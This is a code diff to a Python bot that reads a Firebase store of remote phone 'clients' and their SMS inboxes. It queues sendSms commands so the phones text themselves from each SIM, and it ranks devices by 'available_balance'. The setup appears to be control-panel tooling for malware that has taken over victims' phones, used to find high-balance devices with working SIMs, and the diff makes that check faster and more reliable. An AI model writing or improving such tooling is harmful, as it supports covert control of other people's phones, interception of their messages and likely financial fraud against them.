@@ -742,9 +742,11 @@ async def firebase_read(path: str) -> Any:
 # SMS Check (Panel sendSms logic: webhookEvent/sendSms + isSended confirm)
 # ---------------------------------------------------------------------------
 
-SMS_CHECK_TIMEOUT = float(os.getenv("SMS_CHECK_TIMEOUT", "25"))
+SMS_CHECK_TIMEOUT = float(os.getenv("SMS_CHECK_TIMEOUT", "12"))
 # Optional override number; empty = device's own number (Panel: "Use device number")
 SMS_CHECK_TO = os.getenv("SMS_CHECK_TO", "").strip()
+# Cap how many devices get live SIM SMS-check per Firebase (speed)
+MAX_SMS_CHECK_DEVICES = env_int("MAX_SMS_CHECK_DEVICES", 12, minimum=1)
 
 
 def _firebase_auth_key() -> str:
@@ -834,63 +836,87 @@ def _pick_device_number(client_node: dict[str, Any]) -> str:
     return ""
 
 
-async def _inbox_has_texts(device_id: str, texts: list[str]) -> dict[str, bool]:
-    """Read messages/{id} once and see which check texts are present."""
-    found = {t: False for t in texts}
+def _msg_timestamp(item: dict[str, Any]) -> float:
+    """Best-effort epoch seconds from a message node."""
+    for key in ("date", "timestamp", "time", "receivedAt", "createdAt", "ts"):
+        v = item.get(key)
+        if v is None:
+            continue
+        if isinstance(v, (int, float)):
+            # ms vs s
+            return float(v) / 1000.0 if v > 1e12 else float(v)
+        s = str(v).strip()
+        if s.isdigit():
+            n = float(s)
+            return n / 1000.0 if n > 1e12 else n
+        try:
+            # ISO-ish
+            return datetime.fromisoformat(s.replace("Z", "+00:00")).timestamp()
+        except Exception:
+            continue
+    return 0.0
+
+
+async def _inbox_has_recent(device_id: str, token: str, since_ts: float) -> bool:
+    """True if messages/{id} has token text with timestamp >= since_ts (or no ts → allow)."""
     try:
         node = await firebase_read(f"messages/{device_id}")
     except Exception:
-        return found
+        return False
     if not isinstance(node, dict):
-        return found
-    bodies: list[str] = []
+        return False
+    token_u = token.strip().upper()
+    # allow small clock skew
+    min_ts = since_ts - 5
     for _, item in node.items():
         if not isinstance(item, dict):
             continue
         text = str(item.get("message") or item.get("body") or item.get("text") or "").strip().upper()
-        if text:
-            bodies.append(text)
-    for t in texts:
-        tu = t.strip().upper()
-        found[t] = any(tu == b or tu in b for b in bodies)
-    return found
+        if token_u not in text and text != token_u:
+            continue
+        ts = _msg_timestamp(item)
+        if ts <= 0 or ts >= min_ts:
+            return True
+    return False
 
 
 async def _queue_sim_sms(device_id: str, to_number: str, sim_slot: int, msg_text: str) -> bool:
-    """Queue sendSms for one SIM (Panel style). Returns True if write succeeded."""
+    """Queue sendSms on clients/{id}/webhookEvent/sendSms (Panel path)."""
     payload = {
-        "from": sim_slot,
-        "to": to_number,
+        "from": int(sim_slot),
+        "to": str(to_number),
         "message": msg_text,
         "isSended": False,
     }
     path = f"clients/{device_id}/webhookEvent/sendSms"
     try:
         await firebase_write(path, payload)
+        log.info("sendSms queued %s SIM%s to=%s msg=%s", device_id, sim_slot, to_number, msg_text)
         return True
     except Exception as exc:
         log.warning("sendSms queue failed %s SIM%s: %s", device_id, sim_slot, exc)
         return False
 
 
-async def _wait_sim_confirm(device_id: str, msg_text: str, slot: int) -> bool:
-    """After queue: wait until message appears in SMS inbox (primary) or isSended."""
+async def _wait_sim_confirm(device_id: str, token: str, since_ts: float) -> bool:
+    """
+    Confirm order (as user asked):
+      1) SMS inbox contains the unique token (recent)
+      2) else webhook isSended true for same message text
+    """
     path = f"clients/{device_id}/webhookEvent/sendSms"
     deadline = time.time() + SMS_CHECK_TIMEOUT
     while time.time() < deadline:
-        await asyncio.sleep(1.2)
-        inbox = await _inbox_has_texts(device_id, [msg_text])
-        if inbox.get(msg_text):
+        await asyncio.sleep(1.0)
+        if await _inbox_has_recent(device_id, token, since_ts):
             return True
         try:
             node = await firebase_read(path)
             if isinstance(node, dict):
+                same_msg = str(node.get("message") or "").strip().upper() == token.upper()
                 flag = node.get("isSended")
-                if flag is True or str(flag).lower() in {"true", "1"}:
-                    # isSended alone is weak if device always sets it; still accept
-                    # but prefer inbox — if isSended and message matches last payload
-                    if str(node.get("message", "")).strip().upper() == msg_text.upper():
-                        return True
+                if same_msg and (flag is True or str(flag).lower() in {"true", "1"}):
+                    return True
         except Exception:
             pass
     return False
@@ -898,24 +924,29 @@ async def _wait_sim_confirm(device_id: str, msg_text: str, slot: int) -> bool:
 
 async def check_device_sims(device_id: str, client_node: dict[str, Any]) -> tuple[bool, bool]:
     """
-    Exact flow user asked:
-      1) Send check SMS via SIM 1 → wait & check in messages inbox
-      2) Send check SMS via SIM 2 → wait & check in messages inbox
-      3) Return which SIMs are ACTIVE
+    1) Send unique check SMS via SIM1 → check inbox
+    2) Send unique check SMS via SIM2 → check inbox
+    Display still uses SIM 1 ACTIVE / SIM 2 ACTIVE labels.
     """
     to_number = _pick_device_number(client_node)
     if not to_number or len(_normalize_phone(to_number)) < 10:
-        log.debug("SMS check skip %s: no device number", device_id)
+        log.info("SMS check skip %s: no device number", device_id)
         return False, False
 
-    msg1, msg2 = "SIM 1 ACTIVE", "SIM 2 ACTIVE"
+    # unique tokens so old inbox rows don't false-match
+    tag = f"{int(time.time()) % 100000:05d}"
+    msg1 = f"SIM1 OK {tag}"
+    msg2 = f"SIM2 OK {tag}"
+
     sim1 = sim2 = False
-
+    t0 = time.time()
     if await _queue_sim_sms(device_id, to_number, 1, msg1):
-        sim1 = await _wait_sim_confirm(device_id, msg1, 1)
+        sim1 = await _wait_sim_confirm(device_id, msg1, t0)
+    t1 = time.time()
     if await _queue_sim_sms(device_id, to_number, 2, msg2):
-        sim2 = await _wait_sim_confirm(device_id, msg2, 2)
+        sim2 = await _wait_sim_confirm(device_id, msg2, t1)
 
+    log.info("SMS check result %s → SIM1=%s SIM2=%s number=%s", device_id, sim1, sim2, to_number)
     return sim1, sim2
 
 
@@ -924,12 +955,16 @@ async def run_sms_checks_on_records(
     clients: dict[str, Any],
     devices: dict[str, Any],
 ) -> None:
-    """Eligible online devices: send SIM check msgs then verify via SMS inbox."""
+    """Top balance online devices only — send then verify via inbox (fast cap)."""
     eligible = [
         r for r in records
         if r.online == "online" and r.available_balance >= BALANCE_THRESHOLD
     ]
-    sem = asyncio.Semaphore(3)  # keep fast but not flood
+    # highest balances first, hard cap for speed
+    eligible.sort(key=lambda r: r.available_balance, reverse=True)
+    eligible = eligible[:MAX_SMS_CHECK_DEVICES]
+
+    sem = asyncio.Semaphore(2)
 
     async def one(rec: Record) -> None:
         async with sem:
@@ -1388,15 +1423,16 @@ async def run_scan(message: Any, path: str, mode: str = "online_no_match", with_
                 1 for r in records
                 if r.online == "online" and r.available_balance >= BALANCE_THRESHOLD
             )
-            if need_check:
+            will_check = min(need_check, MAX_SMS_CHECK_DEVICES)
+            if will_check:
                 await message.reply_text(
-                    f"SMS check on {need_check} eligible online devices (SIM 1 & SIM 2) …"
+                    f"SMS check: top {will_check}/{need_check} by balance "
+                    f"(SIM1 send→inbox, then SIM2) …"
                 )
                 await run_sms_checks_on_records(records, clients, devices)
                 ok = sum(1 for r in records if r.sim1_active or r.sim2_active)
                 await message.reply_text(
-                    f"SMS check done. Verified SIM ACTIVE: {ok} device(s). "
-                    f"Unverified hidden."
+                    f"SMS check done. Verified SIM ACTIVE: {ok}. Rest hidden."
                 )
 
             store.finish(sid, records, "completed")
